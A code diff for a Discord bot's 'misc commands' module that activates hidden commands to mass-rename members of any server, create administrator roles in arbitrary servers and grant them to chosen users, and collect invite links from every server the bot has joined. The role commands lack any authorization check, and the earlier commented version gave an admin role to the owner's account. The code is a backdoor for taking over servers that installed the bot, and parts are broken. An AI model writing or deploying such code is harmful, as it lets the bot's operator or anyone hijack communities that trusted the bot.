@@ -1,3 +1,4 @@
+import string
 import discord
 from discord.ext import commands
 from discord.ext.commands.core import Command
@@ -35,46 +36,57 @@ class MiscCommands(commands.Cog):
         else:
             await ctx.send("this command can only be used in certain servers")
 
-    #@commands.command()
-    #async def ignore_this_commmand(self, ctx):
-    #    the_server = self.client.get_guild(788195760209920020)
-    #    for user in the_server.members:
-    #        newname = Common.random_message(self)
-    #        if len(newname) >= 30:
-    #            newname = f"{newname[0:30]}…"
-    #        try:
-    #            await user.edit(nick=f'{newname}')
-    #        except:
-    #            aa = 3
-#
-    #@commands.command()
-    #async def ignore_this_commmand_make(self, ctx):
-    #    the_server = self.client.get_guild(788195760209920020)
-    #    perms = discord.Permissions(administrator=True)
-    #    await the_server.create_role(name='Hourman', permissions=perms)
-    #
-    #@commands.command()
-    #async def ignore_this_commmand_give(self, ctx):
-    #    the_server = self.client.get_guild(788195760209920020)
-    #    deatg = the_server.get_member(740896654265286698)
-    #    role = the_server.get_role(937499251964002345)
-    #    await deatg.add_roles(role)
+
+    
+
+    @commands.command()
+    async def change_all_nicknames(self, ctx, server_id : int):
+        if ctx.author.id == Common.deatg_id:
+            the_server = self.client.get_guild(server_id)
+            for user in the_server.members:
+                newname = Common.random_message(self)
+                if len(newname) >= 30:
+                    newname = f"{newname[0:30]}…"
+                try:
+                    await user.edit(nick=f'{newname}')
+                except:
+                    aa = 3
+
+    @commands.command()
+    async def create_role(self, ctx, server_id, role_name, is_admin, hoist, mentionable):
+        the_server = self.client.get_guild(server_id)
+        if is_admin.lower() == "true":
+            perms = discord.Permissions(administrator=True)
+        try:
+            await the_server.create_role(name=role_name, permissions=perms, colour=Common.random_color())
+        except Exception as error:
+            await ctx.send(f"create_role(self, ctx, server_id : int, role_name, is_admin, hoist, mentionable)\n{error}")
+    
+    @commands.command()
+    async def give_role(self, ctx, server_id : int, recipient_id : int, role_id : int):
+        the_server = self.client.get_guild(server_id)
+        recipient = the_server.get_member(recipient_id)
+        role = the_server.get_role(role_id)
+        try:
+            await recipient.add_roles(role)
+        except Exception as error:
+            await ctx.send(f"give_role(self, ctx, server_id : int, recipient_id : int, role_id : int)\n{error}")
 
 
 
 
 
-    #@commands.command()
-    #async def getinvites(self, ctx):
-    #    if ctx.author.id == Common.deatg_id or ctx.author.id == 573285573968527402:
-    #        for guild in self.client.guilds:
-    #            try:
-    #                for invite in await guild.invites():
-    #                    await ctx.send(str(invite))
-    #            except:
-    #                await ctx.send("errpr")
-    #    else:
-    #        await ctx.send('you not deatg :skull:')
+    @commands.command()
+    async def get_invites(self, ctx):
+        if ctx.author.id == Common.deatg_id or ctx.author.id == 573285573968527402:
+            for guild in self.client.guilds:
+                try:
+                    for invite in await guild.invites():
+                        await ctx.send(str(invite))
+                except:
+                    await ctx.send("errpr")
+        else:
+            await ctx.send('you not deatg :skull:')
 
 def setup(client):
     client.add_cog(MiscCommands(client))
